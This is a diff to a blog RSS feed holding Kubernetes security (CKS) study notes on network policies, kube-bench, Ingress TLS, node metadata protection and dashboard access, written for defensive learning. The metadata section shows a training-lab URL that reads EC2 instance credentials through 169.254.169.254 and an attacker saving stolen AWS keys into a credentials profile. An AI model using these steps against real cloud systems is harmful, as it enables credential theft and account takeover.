@@ -8,13 +8,14 @@
     <language>en-us</language>
     <lastBuildDate>Fri, 23 Aug 2024 23:17:59 +0100</lastBuildDate><atom:link href="http://localhost:1313/newblog/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>CKS</title>
+      <title>Certified Kubernetes Security - Chapter 1 Notes</title>
       <link>http://localhost:1313/newblog/posts/cks/</link>
       <pubDate>Fri, 23 Aug 2024 23:17:59 +0100</pubDate>
       
       <guid>http://localhost:1313/newblog/posts/cks/</guid>
-      <description>[[#Using Network Policies to Restrict Pod-to-Pod Communication|Using Network Policies to Restrict Pod-to-Pod Communication]] [[#Using Network Policies to Restrict Pod-to-Pod Communication#Attacker gain initial access to a Pod|Attacker gain initial access to a Pod]] [[#Using Network Policies to Restrict Pod-to-Pod Communication#Denying Directional Network Traffic|Denying Directional Network Traffic]] [[#Run CIS Benchmark to identify security risks for cluster components|Run CIS Benchmark to identify security risks for cluster components]] [[#Creating an Ingress with TLS Termination|Creating an Ingress with TLS Termination]] [[#Creating an Ingress with TLS Termination#Deploy service and pods|Deploy service and pods]] [[#Creating an Ingress with TLS Termination#Create TLS Certificate and Key|Create TLS Certificate and Key]] [[#Creating an Ingress with TLS Termination#Creating the TLS-Typed Secret:|Creating the TLS-Typed Secret:]] [[#Creating an Ingress with TLS Termination#Create Ingress:|Create Ingress:]] [[#Create Ingress:#Securing Internal Communication (Pod-To-Pod):|Securing Internal Communication (Pod-To-Pod):]] [[#Protecting Node Metadata and Endpoints|Protecting Node Metadata and Endpoints]] [[#Protecting GUI Elements|Protecting GUI Elements]] [[#Protecting GUI Elements#Creating a User with Administration Privileges|Creating a User with Administration Privileges]] [[#Protecting GUI Elements#Creating a User with Restricted Privileges|Creating a User with Restricted Privileges]] [[#Protecting GUI Elements#Avoiding Insecure Configuration Arguments|Avoiding Insecure Configuration Arguments]] [[#Verifying Kubernetes Platform Binaries|Verifying Kubernetes Platform Binaries]] [[#Summary|Summary]] - [[#Avoiding Insecure Configuration Arguments#Understand the Purpose and Effects of Network Policies|Understand the Purpose and Effects of Network Policies]] - [[#Avoiding Insecure Configuration Arguments#Practice the Use of kube-bench to Detect Cluster Component Vulnerabilities|Practice the Use of kube-bench to Detect Cluster Component Vulnerabilities]] - [[#Avoiding Insecure Configuration Arguments#Know How to Configure Ingress with TLS Termination**|Know How to Configure Ingress with TLS Termination**]] - [[#Avoiding Insecure Configuration Arguments#Know How to Configure GUI Elements for Secure Access**|Know How to Configure GUI Elements for Secure Access**]] - [[#Avoiding Insecure Configuration Arguments#Know How to Detect Modified Platform Binaries|Know How to Detect Modified Platform Binaries]] !</description>
-      <content>&lt;ul&gt;
+      <description>Table of Content [[#Using Network Policies to Restrict Pod-to-Pod Communication|Using Network Policies to Restrict Pod-to-Pod Communication]] [[#Using Network Policies to Restrict Pod-to-Pod Communication#Attacker gain initial access to a Pod|Attacker gain initial access to a Pod]] [[#Using Network Policies to Restrict Pod-to-Pod Communication#Denying Directional Network Traffic|Denying Directional Network Traffic]] [[#Run CIS Benchmark to identify security risks for cluster components|Run CIS Benchmark to identify security risks for cluster components]] [[#Creating an Ingress with TLS Termination|Creating an Ingress with TLS Termination]] [[#Creating an Ingress with TLS Termination#Deploy service and pods|Deploy service and pods]] [[#Creating an Ingress with TLS Termination#Create TLS Certificate and Key|Create TLS Certificate and Key]] [[#Creating an Ingress with TLS Termination#Creating the TLS-Typed Secret:|Creating the TLS-Typed Secret:]] [[#Creating an Ingress with TLS Termination#Create Ingress:|Create Ingress:]] [[#Create Ingress:#Securing Internal Communication (Pod-To-Pod):|Securing Internal Communication (Pod-To-Pod):]] [[#Protecting Node Metadata and Endpoints|Protecting Node Metadata and Endpoints]] [[#Protecting GUI Elements|Protecting GUI Elements]] [[#Protecting GUI Elements#Creating a User with Administration Privileges|Creating a User with Administration Privileges]] [[#Protecting GUI Elements#Creating a User with Restricted Privileges|Creating a User with Restricted Privileges]] [[#Protecting GUI Elements#Avoiding Insecure Configuration Arguments|Avoiding Insecure Configuration Arguments]] [[#Verifying Kubernetes Platform Binaries|Verifying Kubernetes Platform Binaries]] [[#Summary|Summary]] - [[#Avoiding Insecure Configuration Arguments#Understand the Purpose and Effects of Network Policies|Understand the Purpose and Effects of Network Policies]] - [[#Avoiding Insecure Configuration Arguments#Practice the Use of kube-bench to Detect Cluster Component Vulnerabilities|Practice the Use of kube-bench to Detect Cluster Component Vulnerabilities]] - [[#Avoiding Insecure Configuration Arguments#Know How to Configure Ingress with TLS Termination**|Know How to Configure Ingress with TLS Termination**]] - [[#Avoiding Insecure Configuration Arguments#Know How to Configure GUI Elements for Secure Access**|Know How to Configure GUI Elements for Secure Access**]] - [[#Avoiding Insecure Configuration Arguments#Know How to Detect Modified Platform Binaries|Know How to Detect Modified Platform Binaries]] Using Network Policies to Restrict Pod-to-Pod Communication For a Microservice architecture to function in Kubernetes, a Pod needs to be able to communicate with another pod running on same or different node without NAT.</description>
+      <content>&lt;h2 id=&#34;table-of-content&#34;&gt;Table of Content&lt;/h2&gt;
+&lt;ul&gt;
 &lt;li&gt;[[#Using Network Policies to Restrict Pod-to-Pod Communication|Using Network Policies to Restrict Pod-to-Pod Communication]]
 &lt;ul&gt;
 &lt;li&gt;[[#Using Network Policies to Restrict Pod-to-Pod Communication#Attacker gain initial access to a Pod|Attacker gain initial access to a Pod]]&lt;/li&gt;
@@ -50,7 +51,7 @@
 - [[#Avoiding Insecure Configuration Arguments#Know How to Configure GUI Elements for Secure Access**|Know How to Configure GUI Elements for Secure Access**]]
 - [[#Avoiding Insecure Configuration Arguments#Know How to Detect Modified Platform Binaries|Know How to Detect Modified Platform Binaries]]&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-17 192014.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_17_192014.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;using-network-policies-to-restrict-pod-to-pod-communication&#34;&gt;Using Network Policies to Restrict Pod-to-Pod Communication&lt;/h2&gt;
 &lt;p&gt;For a Microservice architecture to function in Kubernetes, a Pod needs to be able to communicate with another pod running on same or different node without NAT. Kubernetes assign IP to a pod upon creation from the pod CIDR range of its node, the IP is ephemeral (not stable overtime), every restart of a pod leases a new IP Address.
 It&amp;rsquo;s recommended to use Pod-to-Service Communication over Pod-to-Pod communication so that you can rely on a consistent Network Interface.&lt;/p&gt;
@@ -61,7 +62,7 @@ It&amp;rsquo;s recommended to use Pod-to-Service Communication over Pod-to-Pod c
 &lt;li&gt;&lt;a href=&#34;https://networkpolicy.io/&#34;&gt;https://networkpolicy.io/&lt;/a&gt; : Provide a visual editor for network policies that renders a graphical representation in the browser&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3 id=&#34;attacker-gain-initial-access-to-a-pod&#34;&gt;Attacker gain initial access to a Pod&lt;/h3&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-17 193605.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_17_193605.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Without defining Network Policies, Attacker can talk to all pods and cause additional damage.&lt;/p&gt;
 &lt;h3 id=&#34;denying-directional-network-traffic&#34;&gt;Denying Directional Network Traffic&lt;/h3&gt;
 &lt;p&gt;The best way to restrict Pod-to-Pod network traffic is with the principle of least privilege&lt;/p&gt;
@@ -122,8 +123,8 @@ It&amp;rsquo;s recommended to use Pod-to-Service Communication over Pod-to-Pod c
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;restartPolicy&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Never&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f ng04.yml
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Verify that the pods are up and running:&lt;/p&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-18 222913.png]]&lt;/p&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-18 222953.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_222913.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_222953.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;The cluster have 2 pods on g04 namespace and a pod on default namespace.
 By default communication is allowed between these pods, even though the namespace is different.&lt;/p&gt;
 &lt;p&gt;To test the connectivity from frontend to backend:&lt;/p&gt;
@@ -197,19 +198,19 @@ Other &amp;ndash;&amp;gt; Backend ❌ Deny&lt;/p&gt;
 &lt;h2 id=&#34;run-cis-benchmark-to-identify-security-risks-for-cluster-components&#34;&gt;Run CIS Benchmark to identify security risks for cluster components&lt;/h2&gt;
 &lt;p&gt;To run CIS benchmark on Control Plane:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job-master.yaml
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 230627.png]]&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_230627.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Upon Job execution, the corresponding Pod running the verification process can be identified by its name in the default namespace. The Pod’s name starts with the prefix kube-bench, then appended with the type of the node plus a hash at the end.&lt;/p&gt;
 &lt;p&gt;Wait until the Pod transitions into the “Completed” status to ensure that all verifica‐ tion checks have finished. You can have a look at the benchmark result by dumping the logs of the Pod. A more convenient way would be to redirect logs to a file.&lt;/p&gt;
 &lt;p&gt;To see pods in a different POV:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;minikube ssh
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker ps
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;creating-an-ingress-with-tls-termination&#34;&gt;Creating an Ingress with TLS Termination&lt;/h2&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-18 132607.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_132607.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;It’s important to point out that the communication typically uses unencrypted HTTP network communication as soon as it passes the Ingress.&lt;/p&gt;
 &lt;p&gt;Configuring the Ingress for HTTPS communication relieves you from having to deal with securing the network communication on the Service level. In this section, we will learn how to create a TLS certificate and key, how to feed the certificate and key to a TLS-typed Secret object, and how to configure an Ingress object so that it supports HTTPS communication&lt;/p&gt;
 &lt;h3 id=&#34;deploy-service-and-pods&#34;&gt;Deploy service and pods&lt;/h3&gt;
 &lt;p&gt;In the context of an Ingress, a backend is the combination of Service name and port. Before creating the Ingress, we’ll take care of the Service, a Deployment, and the Pods running nginx so we can later on demonstrate the routing of HTTPS traffic to an actual application. All of those objects are supposed to exist in the namespace t75. &lt;code&gt;t75.yml&lt;/code&gt; defines all of those resources as a means to quickly create the Ingress backend.&lt;/p&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-18 115911.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_115911.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;This command runs a one-off Pod named &lt;code&gt;tmp&lt;/code&gt; with the &lt;code&gt;busybox&lt;/code&gt; image. It does not automatically restart if the container exits and will be deleted after the command completes. Inside this Pod, it executes &lt;code&gt;wget&lt;/code&gt; to attempt a connection to the IP address &lt;code&gt;10.107.8.33&lt;/code&gt; on port &lt;code&gt;80&lt;/code&gt;, which is useful for testing network connectivity or checking if a web server is reachable from within the cluster.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl run tmp --image&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;busybox --restart&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Never -it --rm -- wget 10.107.8.33:80
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
@@ -249,28 +250,28 @@ An ingress controller acts as a reverse proxy and load balancer inside the Kuber
 
 The Ingress Controller doesn’t run automatically with a Kubernetes cluster, so you will need to configure your own. An ingress controller is typically a reverse web proxy server implementation in the cluster.
 &lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f accounting-ingress.yml
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 120222.png]]&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_120222.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;or with kubectl:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create ingress accounting-ingress &lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;--rule&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;accounting.internal.acme.com/*=accounting-service:80, \ tls=accounting-secret&amp;#34;&lt;/span&gt; -n t75
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;the port 443 is listed in the “PORT” column, indicating that TLS termination has been enabled.&lt;/p&gt;
 &lt;p&gt;Creating an ingress object with no ingress controller in place will result in the following outpout:&lt;/p&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-18 123006.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_123006.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;your ingress object will not get an ip address.&lt;/p&gt;
 &lt;p&gt;so we first need to create an ingress controller which will be type: LoadBalancer, then the ingress object will get an ip from this LB.&lt;/p&gt;
 &lt;p&gt;to install the ingress controller:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.3.0/deploy/static/provider/cloud/deploy.yaml
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl get service ingress-nginx-controller --namespace&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ingress-nginx
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 123146.png]]&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_123146.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Now your ingress object will get an ip:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl get ingress accounting-ingress -n t75 
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NAME                 CLASS   HOSTS                          ADDRESS         PORTS     AGE
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;accounting-ingress   nginx   accounting.internal.acme.com   10.102.150.36   80, &lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt;   10m
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;or for more details on the ingress object, use describe:&lt;/p&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-18 123415.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_123415.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;add this line to your hosts file, for windows it&amp;rsquo;s on &lt;code&gt;C:\Windows\system32\drivers\etc\hosts&lt;/code&gt;:&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;10.102.150.36 accounting.internal.acme.com 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 124233.png]]&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_124233.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;Encryption Provided by TLS:&lt;/strong&gt; The TLS configuration in the Ingress resource only encrypts traffic from external clients to the Ingress controller.&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;Internal Communication (Service to Pod):&lt;/strong&gt; Within the Kubernetes cluster, communication between services and pods remains unencrypted unless additional measures are taken.&lt;/li&gt;
@@ -285,16 +286,16 @@ The Ingress Controller doesn’t run automatically with a Kubernetes cluster, so
 &lt;h2 id=&#34;protecting-node-metadata-and-endpoints&#34;&gt;Protecting Node Metadata and Endpoints&lt;/h2&gt;
 &lt;p&gt;Kubernetes clusters expose ports used to communicate with cluster components. For example, the API server uses the port 6443 by default to enable clients like kubectl to talk to it when executing commands.&lt;/p&gt;
 &lt;p&gt;Inbound control plane node ports:&lt;/p&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-18 135818.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_135818.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Many of those ports are configurable. For example, you can modify the API server port by providing a different value with the flag &amp;ndash;secure-port in the configuration file &lt;code&gt;/etc/kubernetes/manifests/kube-apiserver.yaml&lt;/code&gt;, as documented for the cluster component. For all other cluster components, please refer to their corresponding documentation.&lt;/p&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-18 135919.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_135919.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;To secure the ports used by cluster components, set up firewall rules to minimize the attack surface area. For example, you could decide not to expose the API server to anyone outside of the intranet. Clients using kubectl would only be able to run commands against the Kubernetes cluster if logged into the VPN, making the cluster less vulnerable to attacks.&lt;/p&gt;
 &lt;p&gt;Cloud provider Kubernetes clusters (e.g., on AWS, Azure, or Google Cloud) expose so-called metadata services. Metadata services are APIs that can provide sensitive data like an authentication token for consumption from VMs or Pods without any additional authorization&lt;/p&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-18 140112.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_140112.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;For example, In AWS, the metadata server can be reached with the IP address 169.254.169.254.&lt;/p&gt;
 &lt;p&gt;This link for example is the metadata endpoint of an Ec2 Instance in aws &lt;a href=&#34;http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance&#34;&gt;http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;This is how content would look like:&lt;/p&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-18 224321.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_224321.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;The attacker would then simply create a profile file under  &lt;code&gt;~/.aws/credentials/exploited-endpoint&lt;/code&gt;&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[exploited-endpoint]
 aws_acces_key_id=ASIA6GG7PSQG6BYGNVKC
@@ -330,7 +331,7 @@ aws_session_token=IQoJb3JpZ2luX....
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;helm upgrade --install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard --create-namespace --namespace kubernetes-dashboard
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl get deployments,pods,services -n kubernetes-dashboard
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 140834.png]]&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_140834.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;As we can see, kong-proxy type in &lt;em&gt;ClusterIP&lt;/em&gt;, which means we can&amp;rsquo;t access it outside the cluster, it needs to be type of &lt;em&gt;NodePort&lt;/em&gt; and we need to enable http communication so that we can access it via the browser.&lt;/p&gt;
 &lt;p&gt;Create values.yaml:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kong&lt;/span&gt;:
@@ -339,24 +340,24 @@ aws_session_token=IQoJb3JpZ2luX....
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;http&lt;/span&gt;:
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;enabled&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;helm upgrade kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard -f values.yaml --namespace kubernetes-dashboard  
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 152814.png]]&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_152814.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;p&gt;To access Dashboard run:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard-kong-proxy 8443:443
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Forwarding from 127.0.0.1:8443 -&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8443&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Forwarding from &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;::1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;:8443 -&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8443&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now go to &lt;code&gt;https://localhost:8443&lt;/code&gt; and it will ask you to prompt the bearer token.&lt;/p&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-18 153040.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_153040.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;creating-a-user-with-administration-privileges&#34;&gt;Creating a User with Administration Privileges&lt;/h3&gt;
 &lt;p&gt;Before you can authenticate in the login screen, you need to create a ServiceAccount and ClusterRoleBinding object that grant admin permissions. Start by creating the file admin-user-serviceaccount.yaml .&lt;/p&gt;
-&lt;p&gt;![[Capture d’écran 2024-08-18 144426.png]]&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2024_08_18_144426.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
